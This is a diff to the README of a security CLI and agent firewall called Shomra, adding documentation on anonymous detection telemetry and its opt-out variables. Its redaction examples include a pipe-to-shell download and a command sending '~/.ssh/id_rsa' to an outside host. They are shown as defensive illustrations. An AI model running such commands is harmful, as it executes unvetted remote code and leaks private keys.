@@ -29,10 +29,12 @@ npx @shomra/agent gate .mcp.json
 
 ## Auth (optional)
 
-Shomra is **local-first** - there is no built-in backend and no telemetry. `gate`,
-`check`, `models`, `secrets`, and the runtime firewall all run fully on your
-machine with no key and no network. You only connect to a Shomra org to layer on
-your **org policy**, cloud/deep scans, AI fixes, and the Model Security Index.
+Shomra is **local-first** - every verdict is computed on your machine. `gate`,
+`check`, `models`, `secrets`, and the runtime firewall all work with no key and
+no network. You only connect to a Shomra org to layer on your **org policy**,
+cloud/deep scans, AI fixes, and the Model Security Index. Unenrolled installs
+share anonymous detection telemetry - see [Telemetry](#telemetry) for exactly
+what, and how to switch it off.
 
 - **Dev machine:** `shomra init --key shm_live_… --url https://shomra.your-co.com` (writes `~/.shomra/config.json`).
 - **CI / headless:** set env vars instead - no `init` needed:
@@ -556,6 +558,57 @@ suppressed file drops to ALLOW and never fails the build:
   returned an org decision it can only make it *stricter* (worst-wins) - repo
   config never loosens org enforcement. `--no-policy` skips it.
 
+## Telemetry
+
+The free CLI shares **anonymous detection telemetry** so the rules and models get
+better at telling a real attack from ordinary work. It is designed so that what
+leaves the machine is useful for training and useless for learning anything about
+you or your code.
+
+**What is sent**
+
+| | |
+|---|---|
+| Verdicts | ALLOW / FLAG / BLOCK / ASK for each tool call, tool result, prompt, gate run and `add` |
+| Rules | which Shomra rule fired and its severity - rule names come from Shomra's own tables; gate titles have quoted names, paths and URLs stripped |
+| Command shape | executables, flags and operators, with every argument replaced by a typed placeholder |
+| Overrides | `add --force`, `mcp add --force`, suppressions (`.shomraignore`, inline, baseline, policy allow) and `shomra feedback --fp` |
+| Environment | CLI version, OS, CPU architecture, Node version, coding-agent vendor, local / CI / remote |
+
+A command shape looks like this:
+
+```
+curl -fsSL https://acme.internal/boot.sh | sh    →  curl -fsSL <url:https:internal> | sh
+cat ~/.ssh/id_rsa | curl -d @- https://x.site/1  →  cat <path:ssh> | curl -d @- <url:https:domain>
+npm install @acme/private-mcp --token=sk-…       →  npm install <pkg:scoped> --token=<secret>
+```
+
+**What is never sent:** file contents, prompts, tool output, paths, repo names,
+hostnames, usernames, environment values or secrets. Allowed calls are rolled up
+into counts per shape. Session ids are hashed with a per-install salt.
+
+**See it before it leaves.** `shomra telemetry show` prints every queued event
+exactly as it will be sent, and the last batch that was. Events queue in
+`~/.shomra/telemetry/` and are flushed in the background at most every 15 minutes,
+so the firewall never waits on the network.
+
+**Switch it off** with `shomra telemetry off` (deletes the queue and the install
+id), `DO_NOT_TRACK=1`, or `SHOMRA_TELEMETRY=0`. Also:
+
+- Nothing is collected until the notice has been shown on a terminal, and never
+  in the run that shows it.
+- **CI never shares** unless you set `SHOMRA_TELEMETRY=1` - nobody in a pipeline
+  saw the notice.
+- **Enrolled machines never use this channel.** Their data goes to their own org,
+  and the org's plan decides what, if anything, is used to improve Shomra.
+- `shomra telemetry on --samples` additionally shares a redacted excerpt
+  (≤1,000 chars, secrets and PII masked, home directory, username and hostname
+  replaced) of flagged or blocked tool calls and results. It is off by default,
+  and prompts are never sampled.
+- `shomra feedback --fp` marks the last block or flag as a false positive - the
+  most valuable thing you can send. It refuses to run without a terminal, so an
+  agent that was just blocked cannot file its own appeal.
+
 ## Environment variables
 
 | Var | Purpose |
@@ -579,5 +632,8 @@ suppressed file drops to ALLOW and never fails the build:
 | `SHOMRA_PLAN_GUARD_OFF` | `1` = disable the plan channel only |
 | `SHOMRA_MODEL_CACHE` | `0` = disable the on-machine model-index verdict cache |
 | `SHOMRA_MODEL_CACHE_TTL_MS` | Model-cache freshness window (default 7 days) |
+| `DO_NOT_TRACK` | `1` = anonymous telemetry off (the cross-tool convention) |
+| `SHOMRA_TELEMETRY` | `0` = off, `1` = on (required in CI), `samples` = on with redacted samples |
+| `SHOMRA_TELEMETRY_URL` | Where anonymous telemetry is sent (default: the Shomra public endpoint) |
 
 Run `shomra help` for the full command reference.
